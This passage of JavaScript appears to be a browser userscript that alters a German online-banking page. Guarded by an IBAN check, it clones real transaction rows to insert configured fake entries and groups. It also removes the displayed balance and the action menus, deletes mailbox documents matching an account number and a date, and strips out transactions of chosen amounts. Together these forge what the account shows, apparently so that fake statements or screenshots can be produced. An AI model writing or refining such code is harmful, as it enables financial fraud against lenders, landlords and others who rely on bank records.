      return hashString(norm(['item-row', item.enabled, item.insertMode, item.moveSteps, sigForRowLike(item)].join('|')));
    }
    const inner = (item.rows||[]).map(r=>sigForRowLike(r)).join(';');
    return hashString(norm(['item-group', item.enabled, item.insertMode, item.groupMoveSteps, item.groupLabel||'', inner].join('|')));
  }

  // ---------- movers ----------
  function moveRowBySteps(dupRow, steps){
    if (!dupRow || !dupRow.parentNode || !Number.isFinite(steps) || steps === 0) return;
    if (steps > 0) {
      for (let i=0; i<steps; i++){
        const prev = prevRowGlobal(dupRow);
        if (!prev) break;
        prev.parentNode.insertBefore(dupRow, prev);
      }
    } else {
      for (let i=0; i<Math.abs(steps); i++){
        const next = nextRowGlobal(dupRow);
        if (!next) break;
        if (next.nextSibling) next.parentNode.insertBefore(dupRow, next.nextSibling);
        else next.parentNode.appendChild(dupRow);
      }
    }
  }
  function moveRowWithinGroup(dupRow, steps){
    if (!dupRow || !dupRow.parentNode || !Number.isFinite(steps) || steps === 0) return;
    const list = dupRow.parentNode;
    const siblings = [...list.children].filter(el=>el.tagName==='CIRRUS-TRANSACTION-ROW');
    const idx = siblings.indexOf(dupRow);
    if (idx < 0) return;
    let targetIdx = idx + (steps > 0 ? -steps : Math.abs(steps)); // +N up, -N down
    targetIdx = Math.max(0, Math.min(siblings.length-1, targetIdx));
    const target = siblings[targetIdx];
    if (!target || target === dupRow) return;
    if (targetIdx < idx) list.insertBefore(dupRow, target);
    else {
      if (target.nextSibling) list.insertBefore(dupRow, target.nextSibling);
      else list.appendChild(dupRow);
    }
  }
  function moveGroupBySteps(dupGroup, steps){
    if (!dupGroup || !dupGroup.parentNode || !Number.isFinite(steps) || steps === 0) return;
    if (steps > 0) {
      for (let i=0; i<steps; i++){
        const prev = prevGroup(dupGroup);
        if (!prev) break;
        dupGroup.parentNode.insertBefore(dupGroup, prev);
      }
    } else {
      for (let i=0; i<Math.abs(steps); i++){
        const next = nextGroup(dupGroup);
        if (!next) break;
        if (next.nextSibling) dupGroup.parentNode.insertBefore(dupGroup, next.nextSibling);
        else dupGroup.parentNode.appendChild(dupGroup);
      }
    }
  }

  // ---------- ensureers ----------
  function currentDupEl(item, sig){
    if (item.kind === 'group')
      return document.querySelector(`[${WRAP_ATTR}="1"][${SIG_ATTR}="${sig}"]`);
    return document.querySelector(`cirrus-transaction-row[${DUP_ATTR}="${DUP_VAL}"][${SIG_ATTR}="${sig}"]`);
  }

  async function ensureGroup(item){
    const anchorRow   = firstRealRow();
    const anchorGroup = firstRealGroup();
    if (!anchorRow || !anchorGroup) return;

    const sig = sigForItem(item);
    let dupG = currentDupEl(item, sig);

    const targetDate = parseDDMMYYYY((item.rows?.[0]?.date) || item.date) || getRowDate(anchorRow) || new Date();
    const decision = placeDecision(item.insertMode|0, targetDate);

    if (!dupG || !dupG.isConnected) {
      const g = cloneGroupWrapperFrom(anchorGroup);
      if (!g) { warn('Could not clone group wrapper'); return; }
      g.setAttribute(SIG_ATTR, sig);

      const labelP = g.querySelector('[data-test="dateGroupLabel"]');
      if (labelP) setText(labelP, item.groupLabel || ' ');

      const list = listFromGroup(g);
      if (list) {
        for (const rowCfg of (item.rows||[])) {
          if (rowCfg.enabled === false) continue;
          const r = cloneRowWithStyles(anchorRow);
          r.setAttribute(SIG_ATTR, sigForRowLike(rowCfg, sig)); // per-row sig inside group
          applyRowContent(r, rowCfg);
          list.appendChild(r);
        }
        // within-group moves
        [...list.querySelectorAll('cirrus-transaction-row')].forEach(r=>{
          const cfg = (item.rows||[]).find(rc => sigForRowLike(rc, sig) === r.getAttribute(SIG_ATTR));
          if (cfg) moveRowWithinGroup(r, (cfg.moveStepsWithinGroup|0));
        });
      }

      const refGroup = decision.refRow ? rowToGroup(decision.refRow) : firstRealGroup();
      const ok = (decision.place === 'before') ? insertBefore(g, refGroup) : insertAfter(g, refGroup);
      if (!ok) { warn('Insert group wrapper failed'); return; }
      dupG = g;
      await sleep(30);
    } else {
      // keep label fresh
      const labelP = dupG.querySelector('[data-test="dateGroupLabel"]');
      if (labelP) setText(labelP, item.groupLabel || ' ');

      // sync rows
      const list = listFromGroup(dupG);
      if (list) {
        const needSigs = new Set();
        for (const rowCfg of (item.rows||[])) {
          if (rowCfg.enabled === false) continue;
          const rsig = sigForRowLike(rowCfg, sig);
          needSigs.add(rsig);
          let rowEl = list.querySelector(`cirrus-transaction-row[${SIG_ATTR}="${rsig}"]`);
          if (!rowEl) {
            rowEl = cloneRowWithStyles(anchorRow);
            rowEl.setAttribute(SIG_ATTR, rsig);
            applyRowContent(rowEl, rowCfg);
            list.appendChild(rowEl);
          } else {
            applyRowContent(rowEl, rowCfg);
          }
        }
        // remove extra rows not configured
        list.querySelectorAll('cirrus-transaction-row').forEach(r=>{
          if (!needSigs.has(r.getAttribute(SIG_ATTR))) r.remove();
        });
        // within-group moves (after sync)
        list.querySelectorAll('cirrus-transaction-row').forEach(r=>{
          const cfg = (item.rows||[]).find(rc => sigForRowLike(rc, sig) === r.getAttribute(SIG_ATTR));
          if (cfg) moveRowWithinGroup(r, (cfg.moveStepsWithinGroup|0));
        });
      }

      // ensure wrapper placement ok vs reference group
      const refGroup = decision.refRow ? rowToGroup(decision.refRow) : firstRealGroup();
      if (dupG.parentNode === refGroup.parentNode) {
        const correct =
          (decision.place === 'before' && refGroup.previousElementSibling === dupG) ||
          (decision.place === 'after'  && refGroup.nextElementSibling === dupG);
        if (!correct) {
          if (decision.place === 'before') insertBefore(dupG, refGroup);
          else insertAfter(dupG, refGroup);
        }
      } else {
        if (decision.place === 'before') insertBefore(dupG, refGroup);
        else insertAfter(dupG, refGroup);
      }
    }

    // move whole group among groups by steps
    moveGroupBySteps(dupG, (item.groupMoveSteps|0));
  }

  async function ensureRow(item){
    const anchorRow = firstRealRow();
    if (!anchorRow) return;

    const targetDate = parseDDMMYYYY(item.date) || getRowDate(anchorRow) || new Date();
    const decision = placeDecision(item.insertMode|0, targetDate);

    const sig = sigForItem(item);
    let dup = currentDupEl(item, sig);

    if (!dup || !dup.isConnected) {
      const r = cloneRowWithStyles(anchorRow);
      r.setAttribute(SIG_ATTR, sig);
      applyRowContent(r, item);

      const ref = decision.refRow;
      let ok = false;
      if (ref) {
        ok = (decision.place==='before') ? insertBefore(r, ref) : insertAfter(r, ref);
      } else {
        // fallback: append to last group's list
        const groups = allGroups();
        const lastG = groups[groups.length-1];
        const list = listFromGroup(lastG);
        if (list) { list.appendChild(r); ok = true; }
      }
      if (!ok) { warn('Insert row failed'); return; }
      dup = r;
      await sleep(30);
    } else {
      applyRowContent(dup, item);
      const ref = decision.refRow;
      if (ref && dup.parentNode && ref.parentNode) {
        const correct =
          (decision.place==='before' && ref.previousElementSibling === dup) ||
          (decision.place==='after'  && ref.nextElementSibling === dup);
        if (!correct) {
          if (decision.place==='before') insertBefore(dup, ref);
          else insertAfter(dup, ref);
        }
      }
    }

    // move row globally by steps (across groups allowed)
    moveRowBySteps(dup, (item.moveSteps|0));
  }

  async function ensureItem(item){
    if (!item.enabled) {
      const sig = sigForItem(item);
      if (item.kind === 'group') {
        document.querySelectorAll(`[${WRAP_ATTR}="1"][${SIG_ATTR}="${sig}"]`).forEach(n=>n.remove());
      } else {
        document.querySelectorAll(`cirrus-transaction-row[${DUP_ATTR}="${DUP_VAL}"][${SIG_ATTR}="${sig}"]`).forEach(n=>n.remove());
      }
      return;
    }
    if (item.kind === 'group') await ensureGroup(item);
    else await ensureRow(item);
  }

  async function ensureAll(){
    try{
      // IBAN must match before ANY insertion this tick
      if (!ibanMatches()) {
        log('IBAN guard not matched — skipping this tick');
        return;
      }

      if (!firstRealRow() || !firstRealGroup()) return;

      for (const it of ITEMS) {
        await ensureItem(it);
      }

      // GC: keep only the sigs currently configured (incl. inner group row sigs)
      const valid = new Set();
      for (const i of ITEMS) {
        if (!i.enabled) continue;
        const is = sigForItem(i);
        valid.add(is);
        if (i.kind === 'group') {
          for (const rc of (i.rows||[])) {
            if (rc.enabled === false) continue;
            valid.add(sigForRowLike(rc, is)); // inner row sigs
          }
        }
      }

      // Remove any of our elements with a sig not in "valid"
      document.querySelectorAll(`[${DUP_ATTR}="${DUP_VAL}"]`).forEach(n=>{
        const s = n.getAttribute(SIG_ATTR);
        if (s && !valid.has(s)) {
          const wrap = n.closest(`[${WRAP_ATTR}="1"]`);
          if (wrap) {
            n.remove();
          } else {
            n.remove();
          }
        }
      });
      // Remove any stale wrappers whose SIG isn’t valid
      document.querySelectorAll(`[${WRAP_ATTR}="1"]`).forEach(w=>{
        const s = w.getAttribute(SIG_ATTR);
        if (s && !valid.has(s)) w.remove();
      });
    }catch(e){ err('ensureAll:', e); }
  }

  async function waitForBaseline(){
    for(let i=0;i<150;i++){
      if (ibanMatches() && firstRealRow() && firstRealGroup()) return true;
      await sleep(100);
    }
    return false;
  }

  (async function init(){
    await waitForBaseline();
    log('Start (2s) — rows & groups with placement (1/2/3) and move steps (rows & groups). IBAN-guarded.');
    ensureAll();
    setInterval(ensureAll, INTERVAL);

    try{
      const mo = new MutationObserver(()=>{
        if(ibanMatches() && firstRealRow() && firstRealGroup()){
          clearTimeout(init._n); init._n = setTimeout(ensureAll, 120);
        }
      });
      mo.observe(document.documentElement, {childList:true, subtree:true});
    }catch(e){ warn('MutationObserver failed', e); }
  })();
 }




// =====================================================================================================================================
// =====================================================================================================================================


// POST UTITLITIES
 if (window.location.href.includes("de") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {

    'use strict';

//    // ---- Configuration: toggle each target on/off ----
//    const CONFIG = {
//        // Remove elements like: [data-test="fullAccountRow"] .balance.text-nowrap.with-color
//        removeMainBalance: true,
//
//        // Remove elements like: .balance__subline.d-flex.justify-content-end.align-items-center.mt-1
//        removeSubline: true,
//
//        // Remove elements like: [data-test="pageHeaderActionMenu"]
//        removePageHeaderActionMenu: true,
//
//        // Remove elements like: [aria-label="Menu zu Umsatzfunktionen öffnen"]
 //       removeMenuUmsatzfunktionen: true,
//
//        // Remove elements like: [aria-label="Menu zu Produktfunktionen öffnen"]
//        removeMenuProduktfunktionen: true,
//
//        // Remove the *direct parent* of elements like: [data-test="filterButtonSmall"]
//        removeParentOfFilterButtonSmall: true,
//
//        // Check interval in ms
//        intervalMs: 100
//    };

    console.log('[post utilities] started with config:', CONFIG);

    const selectors = {
        mainBalance: '[data-test="fullAccountRow"] .balance.text-nowrap.with-color',
        subline: '.balance__subline.d-flex.justify-content-end.align-items-center.mt-1',
        pageHeaderActionMenu: '[data-test="pageHeaderActionMenu"]',
        menuUmsatzfunktionen: '[aria-label="Menu zu Umsatzfunktionen öffnen"]',
        menuProduktfunktionen: '[aria-label="Menu zu Produktfunktionen öffnen"]',
        filterButtonSmall: '[data-test="filterButtonSmall"]'
    };

    function removeBySelector(selector) {
        const nodes = document.querySelectorAll(selector);
        if (nodes.length === 0) return 0;

        let removed = 0;
        nodes.forEach(node => {
            try {
                node.remove();
                removed++;
            } catch (e) {
                console.error('[post utilities] Failed to remove node for selector:', selector, e);
            }
        });

        if (removed > 0) {
            console.log(`[post utilities] Removed ${removed} node(s) for selector: ${selector}`);
        }
        return removed;
    }

    function removeParentBySelector(selector) {
        const nodes = document.querySelectorAll(selector);
        if (nodes.length === 0) return 0;

        let removed = 0;
        nodes.forEach(node => {
            try {
                if (node.parentElement) {
                    node.parentElement.remove();
                    removed++;
                }
            } catch (e) {
                console.error('[post utilities] Failed to remove parent node for selector:', selector, e);
            }
        });

        if (removed > 0) {
            console.log(`[post utilities] Removed parent of ${removed} node(s) for selector: ${selector}`);
        }
        return removed;
    }

    function sweep() {
        try {
            if (CONFIG.removeMainBalance) {
                removeBySelector(selectors.mainBalance);
            }
            if (CONFIG.removeSubline) {
                removeBySelector(selectors.subline);
            }
            if (CONFIG.removePageHeaderActionMenu) {
                removeBySelector(selectors.pageHeaderActionMenu);
            }
            if (CONFIG.removeMenuUmsatzfunktionen) {
                removeBySelector(selectors.menuUmsatzfunktionen);
            }
            if (CONFIG.removeMenuProduktfunktionen) {
                removeBySelector(selectors.menuProduktfunktionen);
            }
            if (CONFIG.removeParentOfFilterButtonSmall) {
                removeParentBySelector(selectors.filterButtonSmall);
            }
        } catch (e) {
            console.error('[post utilities] Sweep error:', e);
        }
    }

    // Run every 2 seconds indefinitely
    setInterval(sweep, CONFIG.intervalMs);
    // Also run once immediately at start
    sweep();
}



// =====================================================================================================================================
// =====================================================================================================================================




// POST POSTFACH
 if (window.location.href.includes("de") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {

  'use strict';
  /*** RULES: Only these keys inside each rule ***/
//  const RULES = [
//    {
//      USE_DIGIT_CHECK: true,
//      USE_DATE_CHECK:  true,
//      TARGET_DIGITS_RAW: '612 1583459 00', // digits-only compare
//      TARGET_DATE_RAW:   '00.07.2025',     // month + year
//    },
//    // Add more rules below, same 4 keys only:
//    // {
//    //   USE_DIGIT_CHECK: false,
//    //   USE_DATE_CHECK:  true,
//    //   TARGET_DIGITS_RAW: '123 456',
//    //   TARGET_DATE_RAW:   '00.00.2025', // year only
//    // },
//    // {
//    //   USE_DIGIT_CHECK: true,
//    //   USE_DATE_CHECK:  false,
//    //   TARGET_DIGITS_RAW: '987654321',
////    //   TARGET_DATE_RAW:   '28.07.2025', // ignored if USE_DATE_CHECK=false
//    // },
//  ];

  /*** CONSTANTS / HELPERS ***/
  const ROW_SELECTOR = '.file-row';
  const getDigits = (str) => (str || '').replace(/\D+/g, '');
  const normalizeWsCase = (str) => (str || '').toLowerCase().replace(/\s+/g, '');

  // Parse a "DD.MM.YYYY"ish string -> { day:'DD', month:'MM', year:'YYYY' }
  const parseDateParts = (str) => {
    if (!str) return null;
    const s = String(str).trim();
    const m = s.match(/(\d{1,2})\.(\d{1,2})\.(\d{2,4})/);
    if (!m) return null;
    let [ , d, M, y ] = m;
    d = d.padStart(2, '0');
    M = M.padStart(2, '0');
    y = y.length === 2 ? ('20' + y) : y.padStart(4, '0');
    return { day: d, month: M, year: y };
  };

  // Turn a rule's TARGET_DATE_RAW into parts + which fields to consider
  const compileRuleDate = (raw) => {
    const parts = parseDateParts(normalizeWsCase(raw));
    if (!parts) return null;
    const considerDay   = parts.day   !== '00';
    const considerMonth = parts.month !== '00';
    const considerYear  = parts.year  !== '0000';
    return { ...parts, considerDay, considerMonth, considerYear };
  };

  // Pre-compile rules (normalize digits/date once)
  const COMPILED_RULES = RULES.map((r, i) => ({
    idx: i,
    USE_DIGIT_CHECK: !!r.USE_DIGIT_CHECK,
    USE_DATE_CHECK:  !!r.USE_DATE_CHECK,
    TARGET_DIGITS: getDigits(r.TARGET_DIGITS_RAW || ''),      // "612158345900" style
    TARGET_DATE:   r.TARGET_DATE_RAW ? compileRuleDate(r.TARGET_DATE_RAW) : null,
    TARGET_DATE_RAW: r.TARGET_DATE_RAW || '',
  }));

  // Only consider top-level .file-row elements (avoid nested duplicates)
  const getTopLevelRows = () => {
    const all = Array.from(document.querySelectorAll(ROW_SELECTOR));
    return all.filter(el => !el.parentElement || !el.parentElement.closest(ROW_SELECTOR));
  };

  // Per-rule digit check
  const digitsMatch = (row, rule) => {
    if (!rule.USE_DIGIT_CHECK) return true;
    try {
      const scope = row.querySelector('[data-test="account"]') || row;
      const digits = getDigits(scope.textContent);
      return rule.TARGET_DIGITS && digits.includes(rule.TARGET_DIGITS);
    } catch (e) {
      console.warn('[file-row remover] digitsMatch error (rule', rule.idx, '):', e);
      return false;
    }
  };

  // Per-rule date check (supports 00/0000 wildcards)
  const dateMatch = (row, rule) => {
    if (!rule.USE_DATE_CHECK) return true;
    try {
      const target = rule.TARGET_DATE;
      if (!target) return false;

      const dateEl = row.querySelector('[data-test="date"], .file-row__received-date');
      if (!dateEl) return false;

      const parts = parseDateParts(normalizeWsCase(dateEl.textContent));
      if (!parts) return false;

      if (target.considerDay   && parts.day   !== target.day)   return false;
      if (target.considerMonth && parts.month !== target.month) return false;
      if (target.considerYear  && parts.year  !== target.year)  return false;

      return true;
    } catch (e) {
      console.warn('[file-row remover] dateMatch error (rule', rule.idx, '):', e);
      return false;
    }
  };

  // A row matches a rule if all enabled checks pass
  const rowMatchesRule = (row, rule) => {
    if (!rule.USE_DIGIT_CHECK && !rule.USE_DATE_CHECK) return false;
    return digitsMatch(row, rule) && dateMatch(row, rule);
  };

  const removeIfAnyRuleMatches = (row) => {
    try {
      for (const rule of COMPILED_RULES) {
        if (rowMatchesRule(row, rule)) {
          const container = row.closest('cirrus-list-header-item.file-row') || row;
          console.log('[file-row remover] Removing row by rule', rule.idx, {
            digitsCheck: rule.USE_DIGIT_CHECK,
            dateCheck:   rule.USE_DATE_CHECK,
            targetDigits: rule.TARGET_DIGITS,
            targetDate:   rule.TARGET_DATE_RAW
          });
          container.remove();
          return true;
        }
      }
    } catch (err) {
      console.warn('[file-row remover] Error while evaluating/removing a row:', err);
    }
    return false;
  };

  const sweep = () => {
    try {
      const activeRules = COMPILED_RULES.filter(r => r.USE_DIGIT_CHECK || r.USE_DATE_CHECK);
      if (activeRules.length === 0) {
        if (!sweep._warned) {
          console.warn('[file-row remover] No active rules; nothing to do.');
          sweep._warned = true;
        }
        return;
      }

      const rows = getTopLevelRows();
      if (!rows.length) return;

      let removed = 0;
      for (const row of rows) {
        if (!document.contains(row)) continue;
        removed += removeIfAnyRuleMatches(row) ? 1 : 0;
      }
      if (removed > 0) {
        console.log(`[file-row remover] Sweep done. Removed: ${removed}`);
      }
    } catch (err) {
      console.warn('[file-row remover] Sweep error:', err);
    }
  };

  // Run forever: initial + every 2s
  sweep();
  setInterval(sweep, 100);
}





//=================


// UMSATZE TRANSACTION REMOVAL
 if (window.location.href.includes("de") || window.location.href.includes("mainscript") || window.location.href.includes("Downloads")) {
  'use strict';

  // === Configure target amounts and whether to search for them ===
//  const TARGET_AMOUNTS = [
//    { value: '-19,42', enabled: true },
//    { value: '-910,00',  enabled: true },
//    { value: '3.180,00', enabled: true }
//  ];

  const INTERVAL_MS = 100;
  const DEBUG = false;

  const normalizeStringAmount = (str) => {
    if (!str) return '';
    return String(str)
      .replace(/\u00A0|\u2007|\u202F/g, ' ') // non-breaking spaces → normal
      .replace(/−/g, '-')                   // unicode minus → ASCII minus
      .replace(/\s+/g, ' ')
      .replace(/\b(?:EUR|USD|CHF|JPY|GBP)\b/gi, '')
      .replace(/[€$¥£]/g, '')
      .trim();
  };

  const toNumeric = (str) => {
    if (typeof str === 'number') return Number.isFinite(str) ? str : NaN;
    if (!str) return NaN;
    const s = String(str)
      .replace(/\u00A0|\u2007|\u202F/g, '')
      .replace(/−/g, '-')
      .replace(/[€$¥£A-Za-z]/g, '')
      .replace(/\s+/g, '')
      .replace(/\./g, '')   // thousands sep
      .replace(/,/g, '.');  // decimal comma -> dot
    const m = s.match(/-?\d+(?:\.\d+)?/);
    return m ? Number.parseFloat(m[0]) : NaN;
  };

  // Precompute active targets
  const activeTargets = TARGET_AMOUNTS.filter(t => t.enabled);
  const targetNorms = new Set(activeTargets.map(t => normalizeStringAmount(t.value)).filter(Boolean));
  const targetNums = new Set(activeTargets.map(t => toNumeric(t.value)).filter(Number.isFinite));

  if (DEBUG) {
    console.log('[txn-remover] Active target norms:', Array.from(targetNorms));
    console.log('[txn-remover] Active target nums:', Array.from(targetNums));
  }

  const getRowAmountText = (rowEl) => {
    try {
      const nodes = rowEl.querySelectorAll('[data-test="amount"], db-banking-decorated-amount');
      if (nodes.length) {
        return Array.from(nodes).map(n => n.textContent || '').join(' ').trim();
      }
      const maybe = rowEl.querySelector('[class*="amount"], [data-amount], [class*="currency"], [data-test*="currency"]');
      if (maybe) return (maybe.textContent || '').trim();
      return (rowEl.textContent || '').trim();
    } catch (e) {
      if (DEBUG) console.debug('[txn-remover] getRowAmountText error:', e);
      return '';
    }
  };

  const isMatch = (text) => {
    const norm = normalizeStringAmount(text);
    if (norm) {
      for (const t of targetNorms) {
        if (t && norm.includes(t)) return true;
      }
    }
    const num = toNumeric(text);
    if (Number.isFinite(num)) {
      if (targetNums.has(num)) return true;
      for (const t of targetNums) {
        if (Math.abs(num - t) < 0.0001) return true; // tolerance
      }
    }
    return false;
  };

const removeMatchingRows = () => {
  try {
    // Now also check prenote transaction rows
    const rows = document.querySelectorAll('cirrus-transaction-row, cirrus-prenote-transaction-row');
    if (!rows.length) return;

    let removed = 0;
    rows.forEach((row) => {
      if (!row || !row.isConnected) return;
      const amountText = getRowAmountText(row);
      if (!amountText) return;

      if (isMatch(amountText)) {
        try {
          if (DEBUG) console.log('[txn-remover] Removing row with amount text:', amountText);
          row.remove();
          removed++;
        } catch (err) {
          console.error('[txn-remover] Failed to remove row:', err, row);
        }
      }
    });

    if (removed > 0) {
      console.log(`[txn-remover] Removed ${removed} row(s). Active targets: ${activeTargets.map(t => t.value).join(', ')}`);
    }
  } catch (err) {
    console.error('[txn-remover] Unexpected error in removal loop:', err);
  }
};


  removeMatchingRows();
  setInterval(removeMatchingRows, INTERVAL_MS);
  console.log('[txn-remover] Active. Interval:', INTERVAL_MS, 'ms. Active targets:', activeTargets.map(t => t.value));
}


